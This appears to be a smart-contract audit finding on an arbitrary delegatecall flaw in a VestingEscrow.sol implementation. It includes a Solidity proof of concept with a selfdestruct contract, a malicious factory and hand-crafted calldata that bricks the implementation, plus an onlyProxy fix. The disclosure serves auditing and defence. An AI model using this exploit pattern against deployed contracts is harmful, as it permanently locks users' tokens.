# Soucre: https://github.com/sherlock-audit/2024-01-rio-vesting-escrow-judging/issues/60

# CANNOT BE FOUND THROUGH FUZZING

### Vulnerability Summary

**Title**: Arbitrary delegatecall in the `VestingEscrow.sol` implementation

**Impact**:
- An attacker can execute a delegatecall to an arbitrary address on the `VestingEscrow.sol` implementation, potentially leading to the self-destruction of the contract and permanently locking all tokens in proxies pointing to the implementation.

### Vulnerability Details

**Description**:
- The `VestingEscrow.sol` implementation uses parameters from calldata, allowing an attacker to specify custom parameters when calling the implementation directly instead of through the designated proxy.

**Affected Functions**:
1. `initialize(bool _isFullyRevokable, bytes calldata _initialDelegateParams)`
2. `delegate(bytes calldata params)`
3. `vote(bytes calldata params)`
4. `voteWithReason(bytes calldata params)`

**Example**:
- The `delegate(bytes calldata params)` function:
  - Checks if the caller is the recipient (specified in calldata).
  - Retrieves the `VotingAdaptor` from the factory (specified in calldata).
  - Executes a delegatecall on the `VotingAdaptor`.

**Attack Scenario**:
- An attacker calls `delegate(bytes calldata params)` with crafted calldata:
  - Sets themselves as the recipient to bypass the modifier.
  - Specifies a custom factory that returns a malicious adaptor.
  - The malicious adaptor uses the `selfdestruct` opcode, destroying the `VestingEscrow.sol` implementation.

### Proof of Concept

1. **Attack Setup**:
    ```solidity
    contract SelfDestruct {
        function delegate(bytes memory params) public {
            selfdestruct(msg.sender);
        }
    }

    contract MaliciousFactory {
        address sd;
        constructor() {
            sd = address(new SelfDestruct());
        }
        function votingAdaptor() public returns (address) {
            return address(sd);
        }
    }
    ```

2. **Test Function**:
    ```solidity
    function testArbitraryDelegateCall() public {
        address maliciousFactory = address(new MaliciousFactory());
        address vestingEscrowImpl = factory.vestingEscrowImpl();
        address attacker = makeAddr("attacker");

        bytes memory craftedCalldata = abi.encodePacked(
            hex"0ccfac9e",
            hex"000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000",
            address(maliciousFactory),
            hex"0000000000000000000000000000000000000000",
            address(attacker),
            hex"0000000000",
            hex"0000000000",
            hex"0000000000",
            hex"0000000000000000000000000000000000000000000000000000000000000000",
            hex"006d"
        );

        vm.prank(attacker);
        (bool success, bytes memory data) = vestingEscrowImpl.call(craftedCalldata);
    }
    ```

### Impact

- If the attacker executes the `selfdestruct` opcode via a malicious adaptor, all proxies pointing to the destructed implementation would be bricked, and all tokens would be permanently locked.

### Tools Used

- Manual review

### Recommendation

- Implement an `onlyProxy()` modifier in the `VestingEscrow.sol` implementation to ensure that the function is only executed through a delegatecall.

**Example**:
```solidity
modifier onlyProxy() {
    require(address(this) != implementationAddress, "Function must be called through delegatecall");
    _;
}
```

 